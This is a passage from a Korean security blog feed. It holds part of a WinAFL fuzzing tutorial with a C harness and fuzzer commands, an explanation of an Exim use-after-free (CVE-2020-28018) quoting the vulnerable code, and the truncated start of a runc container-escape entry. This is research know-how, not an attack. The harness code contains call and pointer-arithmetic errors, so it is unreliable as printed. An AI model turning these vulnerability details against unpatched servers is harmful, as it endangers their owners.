&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; input &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4;&#xC57C; &#xD568;</li><li>&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1; &#xD574;&#xC57C; &#xD568;</li><li>&#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; input &#xD30C;&#xC77C;&#xC744; &#xB2EB;&#xC544;&#xC57C; &#xD568;</li><li>&#xB9AC;&#xD134;&#xAE4C;&#xC9C0; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC5B4;&#xC57C; &#xD568;</li></ol><p>&#xC704; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC81C;&#xAC00; &#xC0AC;&#xC6A9;&#xD55C; &#xBC29;&#xBC95;&#xC744; &#xC791;&#xC131;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xAE30; &#xC704;&#xD574;&#xC120; &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC5B4;&#xB5A4; DLL&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xC9C0;, &#xADF8; DLL&#xC758; &#xC5ED;&#xD560;&#xC740; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xB300;&#xAC15; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/5.png" alt></p><p>&#xB9C8;&#xC6B0;&#xC2A4; &#xCEE4;&#xC11C;&#xB97C; DLL&#xC704;&#xC5D0; &#xC62C;&#xB824;&#xBCF4;&#xBA74; &#xD30C;&#xC77C; &#xC124;&#xBA85;, &#xC81C;&#xC870;&#xC0AC;, &#xD30C;&#xC77C; &#xBC84;&#xC804; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB294; 1&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xD0C0;&#xAC9F; DLL&#xC744; &#xC815;&#xD558;&#xB294;&#xB370; &#xB3C4;&#xC6C0;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/05/23/fabu1ous/winafl-1/6.png" alt></p><p>&#xC801;&#xB2F9;&#xD55C; DLL&#xC744; &#xCC3E;&#xC73C;&#xC168;&#xB2E4;&#xBA74; IDA&#xB85C; &#xC5F4;&#xC5B4;&#xC11C; Exports &#xD14C;&#xC774;&#xBE14; &#xD6D1;&#xC5B4;&#xBD05;&#xC2DC;&#xB2E4;. &#xC6B4;&#xC774; &#xC88B;&#xB2E4;&#xBA74; External symbol&#xC774; &#xC0B4;&#xC544;&#xC788;&#xB294; &#xD568;&#xC218;&#xB4E4; &#xC911; &#xC774;&#xB984;&#xC5D0; File &#xC5B4;&#xCA4C;&#xACE0;&#xC800;&#xCA4C;&#xACE0;&#xD558;&#xB294; &#xD568;&#xC218;&#xAC00; &#xBA87; &#xAC1C; &#xC788;&#xC744;&#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB984;&#xB9CC; &#xBCF4;&#xACE0;&#xB3C4; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xC758; &#xC790;&#xC9C8;&#xC774; &#xBCF4;&#xC774;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC744; &#xD150;&#xB370; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD55C; &#xD6C4; &#xC704; &#xC870;&#xAC74;&#xC5D0; &#xCDA9;&#xC871;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xCC98;&#xB7FC; External symbol&#xC774; &#xC0B4;&#xC544;&#xC788;&#xB294; &#xD568;&#xC218;&#xAC00; &#xAC70;&#xC758; &#xC5C6;&#xACE0; &#xADF8;&#xB9C8;&#xC800;&#xB3C4; &#xD0C0;&#xAC9F; &#xD568;&#xC218; &#xCDA9;&#xC871; &#xC870;&#xAC74;&#xC5D0; &#xB9CC;&#xC871;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xBA74;</p><p><img src="/2021/05/23/fabu1ous/winafl-1/7.png" alt></p><p>Imports &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xD568;&#xC218;(&#xC608;&#xB97C; &#xB4E4;&#xBA74; fopen, wfopen, wfopen_s, fclose &#xB4F1;)&#xB97C; &#xAC80;&#xC0C9;&#xD574;&#xBCF4;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB798;&#xB3C4; &#xC5C6;&#xB2E4;&#xBA74; &#xC800;&#xB294; &#xB2E4;&#xB978; &#xD0C0;&#xAC9F;&#xC744; &#xCC3E;&#xC544;&#xBCF4;&#xB294;&#xB370; &#xB354; &#xC88B;&#xC740; &#xBC29;&#xBC95;&#xC744; &#xC54C;&#xACE0; &#xACC4;&#xC2E0; &#xBD84;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xB313;&#xAE00;&#xB85C; &#xB0A8;&#xACA8;&#xC8FC;&#xC138;&#xC694;. &#xC800;&#xB294; Imports &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; DLL&#xC774; <code>MSVCR100!fclose()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC54C;&#xC544;&#xB0C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/8.png" alt></p><p><img src="/2021/05/23/fabu1ous/winafl-1/9.png" alt></p><p>&#xADF8;&#xB2E4;&#xC74C; Windbg&#xB85C; &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC5F4;&#xC5B4; &#xBC29;&#xAE08; &#xC54C;&#xC544;&#xB0B8; <code>MSVCR100!fclose()</code>&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xACE0; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xB0C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>fclose()</code>&#xC758; &#xC2E4;&#xD589;&#xC774; &#xB05D;&#xB098;&#xBA74; <code>TargetDLL+0xbf62d</code>&#xB85C; &#xB9AC;&#xD134;&#xD55C;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC54C; &#xC218; &#xC788;&#xACE0;</p><p><img src="/2021/05/23/fabu1ous/winafl-1/10.png" alt></p><p>&#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; &#xC544;&#xC774;&#xB2E4;&#xB85C; &#xC5F4;&#xC5B4;(&#xB2E8;&#xCD95;&#xD0A4; g : Jump to address) &#xD568;&#xC218;&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF8; &#xACB0;&#xACFC; file open, file parsing, file close &#xC791;&#xC5C5;&#xC774; &#xBAA8;&#xB450; &#xC788;&#xC5C8;&#xACE0; &#xB530;&#xB77C;&#xC11C; <code>TargetDLL+0xbf5c0</code>&#xC744; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB85C; &#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC57D;&#xAC04;&#xC758; &#xD301;&#xC744; &#xB4DC;&#xB9AC;&#xC790;&#xBA74; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xAC00; &#xBC1B;&#xB294; &#xC778;&#xC790;&#xAC00; &#xC801;&#xC73C;&#xBA74; &#xC801;&#xC744;&#xC218;&#xB85D; &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xC778; Harness &#xC791;&#xC131;&#xC774; &#xC26C;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD30C;&#xC77C; &#xC774;&#xB984;&#xB9CC;&#xC744; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xB294;&#xB2E4;&#xBA74; Best!</p><h1 id="Harness"><a href="#Harness" class="headerlink" title="Harness"></a>Harness</h1><p>&#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB97C; &#xC815;&#xD588;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xD0C0;&#xAC9F; DLL&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xAC00; &#xD544;&#xC694;&#xB85C; &#xD558;&#xB294; &#xCD08;&#xAE30; &#xC124;&#xC815;&#xC744; &#xD574;&#xC8FC;&#xB294; Harness &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC791;&#xC131;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xD2C0;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>TargetDLL.dll &#xB85C;&#xB4DC;</li><li>GetProcAddress()&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xBC1B;&#xC544;&#xC634;</li><li>&#xD0C0;&#xAC9F; &#xD568;&#xC218; &#xD638;&#xCD9C;</li></ol><p>&#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC81C;&#xAC00; &#xC815;&#xD55C; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB294; &#xC2EC;&#xBCFC;&#xC774; &#xC8FD;&#xC5B4;&#xC788;&#xB354;&#xAD70;&#xC694;. GetProcAddress()&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB97C; &#xBC1B;&#xC544;&#xC62C; &#xC218; &#xC5C6;&#xC73C;&#xB2C8; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>TargetDll.dll &#xB85C;&#xB4DC;</li><li>TargetDll.dll&#xC758; base &#xC8FC;&#xC18C; + &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xC758; offset = &#xD0C0;&#xAC9F; &#xD568;&#xC218; &#xC8FC;&#xC18C;</li><li>&#xD0C0;&#xAC9F; &#xD568;&#xC218; &#xD638;&#xCD9C;</li></ol><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*TARGET)</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* filename)</span></span>;TARGET funcPtr;<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) __declspec(noinline) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fuzzme</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* path)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">int</span> result = funcPtr(path);<span class="hljs-keyword">return</span> result;} <span class="hljs-comment">// &#xD37C;&#xC800;&#xC5D0; &#xC9C0;&#xC815;&#xD574;&#xC904; &#xBC18;&#xBCF5; &#xC2E4;&#xD589; &#xB300;&#xC0C1;&#xC785;&#xB2C8;&#xB2E4;. Extern symbol&#xC744; &#xC0B4;&#xB824;&#xB450;&#xACE0;</span><span class="hljs-comment">// &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xC778;&#xB77C;&#xC778; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</span><span class="hljs-function"><span class="hljs-keyword">wchar_t</span>* <span class="hljs-title">charToWChar</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* text)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">size_t</span> size = <span class="hljs-built_in">strlen</span>(text) + <span class="hljs-number">1</span>;<span class="hljs-keyword">wchar_t</span>* wa = (<span class="hljs-keyword">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">wchar_t</span>) * size);mbstowcs(wa, text, size);<span class="hljs-keyword">return</span> wa;}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>{SetDllDirectory(<span class="hljs-string">&quot;...&quot;</span>); <span class="hljs-comment">// Dll &#xACBD;&#xB85C;</span>HMODULE DLLHandle = LoadLibrary(<span class="hljs-string">&quot;TargetDll.dll&quot;</span>); <span class="hljs-comment">// &#xD0C0;&#xAC9F; DLL</span><span class="hljs-keyword">if</span> (DLLHandle == <span class="hljs-number">0</span>){<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot load TargetDll.dll\n&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}funcPtr = (TARGET)DLLHandle + <span class="hljs-number">0xbf5c0</span>; <span class="hljs-comment">// base + offset</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, DLLHandle);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, funcPtr);<span class="hljs-keyword">int</span> result = fuzzme(funcPtr, charToWChar(argv[<span class="hljs-number">1</span>]));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, result);}</code></pre><p>&#xD30C;&#xC77C; &#xC774;&#xB984;&#xC744; <code>main</code>&#xC758; <code>argv</code>&#xB85C; &#xBC1B;&#xC544;&#xC640; <code>fuzzme</code>&#xB97C; &#xAC70;&#xCCD0; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; Harness &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xD0C0;&#xAC9F; DLL&#xC774; 32bit&#xACE0; WinAFL&#xB3C4; 32bit&#xB85C; &#xBE4C;&#xB4DC;&#xD588;&#xB294;&#xB370; Harness&#xB97C; 64bit&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xBA74; &#xC548; &#xB418;&#xACA0;&#xC8E0;? 32bit&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lsl">cd %DynamoRIO&#xACBD;&#xB85C;%\bin32drrun.exe -c <span class="hljs-string">&quot;%winafl&#xACBD;&#xB85C;%<span class="hljs-subst">\\</span>build32<span class="hljs-subst">\\</span>bin<span class="hljs-subst">\\</span>Release<span class="hljs-subst">\\</span>winafl.dll&quot;</span> -debug -target_module harness.exe -coverage_module <span class="hljs-string">&quot;%&#xD0C0;&#xAC9F;DLL&#xACBD;&#xB85C;%&quot;</span> -target_method fuzzme -fuzz_iterations <span class="hljs-number">10</span> -nargs <span class="hljs-number">1</span> -- <span class="hljs-string">&quot;%harness&#xACBD;&#xB85C;%&quot;</span> <span class="hljs-string">&quot;%&#xD30C;&#xC77C;&#xACBD;&#xB85C;%&quot;</span></code></pre><p>&#xC774;&#xC81C; &#xC791;&#xC131;&#xD55C; Harness&#xB97C; &#xB514;&#xBC84;&#xADF8; &#xBAA8;&#xB4DC;&#xB85C; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCFC; &#xC2DC;&#xAC04;&#xC785;&#xB2C8;&#xB2E4;. DanamoRIO&#xC758; bin32 &#xD3F4;&#xB354;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00; &#xC704;&#xC640; &#xAC19;&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; Harness&#xAC00; &#xD37C;&#xC9D5;&#xC5D0; &#xC801;&#xD569;&#xD55C;&#xC9C0; &#xAC80;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/11.png" alt></p><p>&#xD14C;&#xC2A4;&#xD2B8;&#xAC00; &#xB05D;&#xB098;&#xBA74; bin32 &#xD3F4;&#xB354;&#xC5D0; &#xD14C;&#xC2A4;&#xD2B8; &#xB85C;&#xADF8;&#xAC00; &#xB0A8;&#xC544;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xD14C;&#xC2A4;&#xD2B8; &#xC635;&#xC158; &#xC911; <code>iterations</code>&#xB97C; 10&#xC73C;&#xB85C; &#xC8FC;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C; &#xCD1D; 10&#xBC88;&#xC758; &#xC2E4;&#xD589;&#xC774; &#xB85C;&#xADF8;&#xC5D0; &#xB0A8;&#xC544;&#xC788;&#xC5B4;&#xC57C; &#xD558;&#xBA70; &#x201C;Everything appears to be running normally.&#x201D;&#xB77C;&#xB294; &#xB85C;&#xADF8;&#xAC00; &#xC788;&#xB2E4;&#xBA74; &#xC131;&#xACF5;&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB9C8;&#xAD6C;-&#xD37C;&#xC9D5;&#xD558;&#xAE30;"><a href="#&#xB9C8;&#xAD6C;-&#xD37C;&#xC9D5;&#xD558;&#xAE30;" class="headerlink" title="&#xB9C8;&#xAD6C; &#xD37C;&#xC9D5;&#xD558;&#xAE30;"></a>&#xB9C8;&#xAD6C; &#xD37C;&#xC9D5;&#xD558;&#xAE30;</h1><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> <span class="hljs-string">&quot;%winafl-master%&#xACBD;&#xB85C;\build32\bin\Release&quot;</span><span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -D %DynamoRIO&#xACBD;&#xB85C;% -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe - target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">1</span> -- <span class="hljs-string">&quot;%harness&#xACBD;&#xB85C;&quot;</span> @@</code></pre><p>&#xC790;! &#xB4DC;&#xB514;&#xC5B4; &#xD37C;&#xC9D5;&#xC744; &#xD560; &#xB54C;&#xAC00; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBE4C;&#xB4DC;&#xD55C; WinAFL &#xD3F4;&#xB354;&#xB85C; &#xC774;&#xB3D9;&#xD55C; &#xD6C4; &#xC704; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC785;&#xB825;&#xD574; &#xD37C;&#xC9D5;&#xC744; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. WinAFL&#xC774; <code>fuzzme</code> &#xD568;&#xC218;&#xB97C; 5000&#xBC88; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC7AC;&#xC2DC;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xC635;&#xC158;&#xC744; &#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/12.png" alt></p><p>&#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; WinAFL&#xC740; &#xC5C4;&#xCCAD;&#xB09C; &#xC18D;&#xB3C4;&#xB85C; &#xD392;&#x2026;</p><p><img src="/2021/05/23/fabu1ous/winafl-1/13.png" alt></p><p><img src="/2021/05/23/fabu1ous/winafl-1/14.png" alt></p><h1 id="Part-2-&#xC608;&#xACE0;"><a href="#Part-2-&#xC608;&#xACE0;" class="headerlink" title="Part 2 &#xC608;&#xACE0;"></a>Part 2 &#xC608;&#xACE0;</h1><p>3&#xCD08;&#xC5D0; 1&#xBC88; &#xAF34;&#xB85C; &#xD0C0;&#xAC9F;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC78; &#xBCF4;&#xBA74; Harness&#xC5D0; &#xD070; &#xD558;&#xC790;&#xAC00; &#xC788;&#xB294; &#xAC83;&#xC774; &#xBD84;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC120; &#xC774; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xAC1C;&#xC120;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0BD;&#xC9C8;&#xD55C; &#xACFC;&#xC815;&#xC744; &#xC791;&#xC131;&#xD574; &#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzzing</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>winafl</tag>
      
      <tag>harness</tag>
      
      <tag>bug bounty</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-28018: Unix 계열 메일 에이전트 RCE</title>
    <link href="/2021/05/22/fabu1ous/2021-05-22/"/>
    <url>/2021/05/22/fabu1ous/2021-05-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://adepts.of0x.cc/exim-cve-2020-28018/">CVE-2020-28018 (Use-After-Free in Exim)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Exim 4 &lt;= 4.92.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Unix &#xACC4;&#xC5F4; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC758; MTA(Mail Transfer Agent)&#xC778; Exim&#xC5D0;&#xC11C; use-after-free &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>tls-openssl.c</code>&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xBC0F; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> tls<span class="hljs-constructor">_write(<span class="hljs-params">void</span> <span class="hljs-operator">*</span> <span class="hljs-params">ct_ctx</span>, <span class="hljs-params">const</span> <span class="hljs-params">uschar</span> <span class="hljs-operator">*</span><span class="hljs-params">buff</span>, <span class="hljs-params">size_t</span> <span class="hljs-params">len</span>, BOOL <span class="hljs-params">more</span>)</span>{...  corked = <span class="hljs-built_in">string</span><span class="hljs-constructor">_catn(<span class="hljs-params">corked</span>, <span class="hljs-params">buff</span>, <span class="hljs-params">len</span>)</span>;    ...  <span class="hljs-keyword">if</span> (more)    return len;  buff = CUS corked-&gt;s;  len = corked-&gt;ptr;  corked = NULL;...}</code></pre><p>&#xC704;&#xB294; <code>tls-openssl.c</code>&#xC758; &#xD568;&#xC218; <code>tls_write()</code> &#xC77C;&#xBD80; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; <code>string_catn()</code>&#xB294; <code>gstring</code> &#xAD6C;&#xC870;&#xCCB4;&#xAC00; request &#xB370;&#xC774;&#xD130;&#xB97C; &#xB2F4;&#xAE30;&#xC5D0; &#xCDA9;&#xBD84;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xACE0; <code>gstring_grow()</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xCCAD;&#xD06C;&#xB97C; &#xD560;&#xB2F9;&#xD55C; &#xD6C4; <code>gstring-&gt;s</code> &#xD544;&#xB4DC;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. <code>string_catn()</code>&#xC774; &#xBC18;&#xD658;&#xD55C; <code>gstring</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; <code>corked</code>&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC774;&#xD6C4;&#xC5D0; <code>gstring</code>&#xC5D0; &#xC811;&#xADFC;&#xD574;&#xC57C; &#xD560; &#xC77C;&#xC774; &#xC0DD;&#xAE30;&#xBA74; <code>corked</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; <code>corked</code>&#xAC00; NULL&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xB294; &#xB8E8;&#xD2F4;&#xC744; &#xBB34;&#xC2DC;&#xD560; &#xC218; &#xC788;&#xC5B4; <code>corked-&gt;s</code>&#xAC00;  &#xD574;&#xC81C;&#xB41C; &#xC774;&#xD6C4;&#xC5D0;&#xB3C4; <code>corked</code>&#xB97C; &#xD1B5;&#xD574; &#xC811;&#xADFC;(use-after-free)&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>unix</tag>
      
      <tag>exim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30465: Docker, Kubernetes의 runc Container Escape 취약점</title>
    <link href="/2021/05/21/l0ch/2021-05-21/"/>
    <url>/2021/05/21/l0ch/2021-05-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/157">CVE-2021-30465: runc &lt;1.0.0-rc95 vulnerable to symlink-exchange attack</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>runc &#x2264; 1.0.0-rc94 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Docker, Kubernetes &#xB4F1; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xAE30;&#xBC18; &#xAC00;&#xC0C1;&#xD654; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; runc&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xBCF4;&#xACE0;&#xC11C;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>runc&#xB294; OCI(Open Container Initiative) &#xD45C;&#xC900;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xC0DD;&#xC131;&#xACFC; &#xC2E4;&#xD589;&#xC744; &#xC704;&#xD574; &#xC124;&#xACC4;&#xB41C; CLI &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xC9C0;&#xB09C; 2019&#xB144; Container escape &#xCDE8;&#xC57D;&#xC810;(CVE-2019-5736)&#xC774; &#xACF5;&#xAC1C;&#xB41C; &#xB370; &#xC774;&#xC5B4; &#xC774;&#xBC88;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC740; symlink exchange attack&#xC73C;&#xB85C; &#xD638;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0; 